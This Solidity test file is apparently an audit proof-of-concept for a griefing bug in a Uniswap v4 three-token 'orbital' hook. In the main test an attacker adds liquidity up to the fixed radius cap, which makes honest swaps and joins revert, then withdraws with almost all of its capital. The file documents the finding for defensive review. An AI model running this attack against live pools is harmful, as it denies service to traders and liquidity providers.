// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {
    TestBase_UniswapV4StandardExchangeOrbitalBufferHook
} from "contracts/hooks/uniswap/v4/standardExchange/orbital/TestBase_UniswapV4StandardExchangeOrbitalBufferHook.sol";

/// @notice h2-dos-stuck: the orbital radius R is fixed forever at 10x the first mint
/// (OrbitalCommon.sol:1309-1327, Math.firstMintRadius, R_SAFETY_MULTIPLIER=10) and every later
/// join/swap must keep each effective leg strictly below R (_requirePostUnderRadius, :593-598).
/// The sphere is re-centred on (R,R,R) with L recomputed from live reserves, so swap depth is
/// proportional to (R - x). Any unprivileged LP can join up to just under R:
///   - swap depth collapses (honest swaps get a fraction of the fair output or revert),
///   - every honest join reverts (pool TVL is permanently capped),
///   - the attacker exits pro-rata later and recovers its capital (no swap fees paid).
contract OrbitalRadiusCap is TestBase_UniswapV4StandardExchangeOrbitalBufferHook {
    address internal attacker = address(0xA11CE);
    address internal trader = address(0x7EADE5);
    address internal lp2 = address(0x1B2);

    uint256 internal constant SEED = 1_000 ether;

    function _mintApprove(address who, uint256 amt) internal {
        token0.mint(who, amt);
        token1.mint(who, amt);
        token2.mint(who, amt);
        vm.startPrank(who);
        token0.approve(hook, type(uint256).max);
        token1.approve(hook, type(uint256).max);
        token2.approve(hook, type(uint256).max);
        token0.approve(address(swapRouter), type(uint256).max);
        token1.approve(address(swapRouter), type(uint256).max);
        token2.approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();
    }

    /// external so it can be try/caught; returns token1 received for `amountIn` token0
    function traderSwap0to1(uint256 amountIn) external returns (uint256 got) {
        require(msg.sender == address(this), "self");
        PoolKey memory key = _poolKeyFor(address(token0), address(token1));
        bool zeroForOne = address(token0) == Currency.unwrap(key.currency0);
        uint256 b = token1.balanceOf(trader);
        vm.prank(trader);
        swapRouter.swapExactIn(
            key,
            SwapParams({zeroForOne: zeroForOne, amountSpecified: -int256(amountIn), sqrtPriceLimitX96: _sqrtLimit(zeroForOne)}),
            ""
        );
        got = token1.balanceOf(trader) - b;
    }

    function lp2Join(uint256 amt) external returns (uint256 shares) {
        require(msg.sender == address(this), "self");
        vm.prank(lp2);
        (shares,,,) = orbital.addLiquidity(amt, amt, amt, lp2, 0, block.timestamp + 1 hours, "");
    }

    function _tryTrade(uint256 amountIn) internal returns (bool ok, uint256 got) {
        uint256 snap = vm.snapshotState();
        try this.traderSwap0to1(amountIn) returns (uint256 g) { ok = true; got = g; } catch { ok = false; }
        vm.revertToState(snap);
    }

    function _tryJoin(uint256 amt) internal returns (bool ok) {
        uint256 snap = vm.snapshotState();
        try this.lp2Join(amt) returns (uint256) { ok = true; } catch { ok = false; }
        vm.revertToState(snap);
    }

    function test_orbital_radius_cap_grief() public {
        // ---- honest setup ----
        _seedThreeLeg(SEED); // honest LP `user` seeds 1,000 of each leg -> R = 10,000 (wad)
        _mintApprove(trader, 1_000 ether);
        _mintApprove(lp2, 1_000 ether);
        uint256 R = orbital.radius();
        (uint256 e0,,) = orbital.effectiveReserves();
        emit log_named_uint("R (wad)                   ", R);
        emit log_named_uint("leg0 effective before     ", e0);

        (bool okA, uint256 got10Before) = _tryTrade(10 ether);
        (bool okB, uint256 got100Before) = _tryTrade(100 ether);
        bool joinBefore = _tryJoin(100 ether);
        assertTrue(okA && okB && joinBefore, "baseline honest ops work");
        emit log_named_uint("baseline: 10 t0 -> t1     ", got10Before);
        emit log_named_uint("baseline: 100 t0 -> t1    ", got100Before);

        // ---- attack: unprivileged attacker joins to just under R ----
        uint256 atk = 8_950 ether;
        _mintApprove(attacker, atk);
        uint256 a0Start = token0.balanceOf(attacker);
        uint256 a1Start = token1.balanceOf(attacker);
        uint256 a2Start = token2.balanceOf(attacker);
        vm.prank(attacker);
        (uint256 atkShares,,,) = orbital.addLiquidity(atk, atk, atk, attacker, 0, block.timestamp + 1 hours, "");
        {
            (uint256 x0, uint256 x1, uint256 x2) = orbital.effectiveReserves();
            emit log_named_uint("leg0 effective after join ", x0);
            emit log_named_uint("leg1 effective after join ", x1);
            emit log_named_uint("leg2 effective after join ", x2);
        }

        // ---- impact on honest users ----
        (bool ok10, uint256 got10After) = _tryTrade(10 ether);
        (bool ok100,) = _tryTrade(100 ether);
        bool joinAfter = _tryJoin(100 ether);
        emit log_named_uint("after: 10 t0 -> t1        ", ok10 ? got10After : 0);
        emit log_named_string("after: 100 t0 swap        ", ok100 ? "ok" : "REVERTS");
        emit log_named_string("after: honest 100 join    ", joinAfter ? "ok" : "REVERTS");
        assertFalse(ok100, "100-unit swap now reverts (was fine before)");
        assertFalse(joinAfter, "honest join now reverts (TVL capped)");
        // small swaps still execute, but are priced off a book whose depth is (R - x)
        emit log_named_string("after: 10 t0 swap         ", ok10 ? "ok" : "REVERTS");

        // ---- attacker exits later and recovers its capital ----
        vm.warp(block.timestamp + 1 days);
        vm.prank(attacker);
        orbital.removeLiquidity(atkShares, attacker, 0, 0, 0, block.timestamp + 1 hours);
        uint256 a0End = token0.balanceOf(attacker);
        uint256 a1End = token1.balanceOf(attacker);
        uint256 a2End = token2.balanceOf(attacker);
        uint256 spent = (a0Start + a1Start + a2Start);
        uint256 back = (a0End + a1End + a2End);
        emit log_named_uint("attacker capital in (sum) ", spent);
        emit log_named_uint("attacker capital out (sum)", back);
        // attacker cost is only SE usage-fee rounding: < 0.1% of capital
        assertGe(back * 1_000, spent * 999, "attacker recovers >=99.9% of capital");
        emit log_named_uint("attacker net cost (sum)   ", spent - back);
    }

    function traderSwap(address tin, address tout, uint256 amountIn) external returns (uint256 got) {
        require(msg.sender == address(this), "self");
        PoolKey memory key = _poolKeyFor(tin, tout);
        bool zeroForOne = tin == Currency.unwrap(key.currency0);
        uint256 b = IERC20(tout).balanceOf(trader);
        vm.prank(trader);
        swapRouter.swapExactIn(
            key,
            SwapParams({zeroForOne: zeroForOne, amountSpecified: -int256(amountIn), sqrtPriceLimitX96: _sqrtLimit(zeroForOne)}),
            ""
        );
        got = IERC20(tout).balanceOf(trader) - b;
    }

    /// Probe: is near-cap pricing a round-trip profit for an unprivileged trader (honest LPs only)?
    function test_orbital_near_cap_roundtrip_probe() public {
        _seedThreeLeg(SEED);
        _mintApprove(lp2, 8_930 ether);
        vm.prank(lp2);
        orbital.addLiquidity(8_930 ether, 8_930 ether, 8_930 ether, lp2, 0, block.timestamp + 1 hours, "");
        (uint256 x0, uint256 x1, uint256 x2) = orbital.effectiveReserves();
        emit log_named_uint("R   ", orbital.radius());
        emit log_named_uint("e0  ", x0);
        emit log_named_uint("e1  ", x1);
        emit log_named_uint("e2  ", x2);
        _mintApprove(trader, 0);
        token0.mint(trader, 10 ether);
        uint256 start = token0.balanceOf(trader);
        uint256 got1 = this.traderSwap(address(token0), address(token1), 10 ether);
        emit log_named_uint("t0 10 -> t1 ", got1);
        uint256 got0 = this.traderSwap(address(token1), address(token0), got1);
        emit log_named_uint("t1 back -> t0", got0);
        emit log_named_int("round-trip pnl t0", int256(token0.balanceOf(trader)) - int256(start));
    }

    /// Honest growth alone: the pool can never exceed ~10x its first mint.
    function test_orbital_tvl_hard_cap_honest() public {
        _seedThreeLeg(SEED);
        _mintApprove(lp2, 20_000 ether);
        assertFalse(_tryJoin(9_000 ether), "a 9x proportional join reverts");
        assertTrue(_tryJoin(8_000 ether), "an 8x join still fits");
    }
}
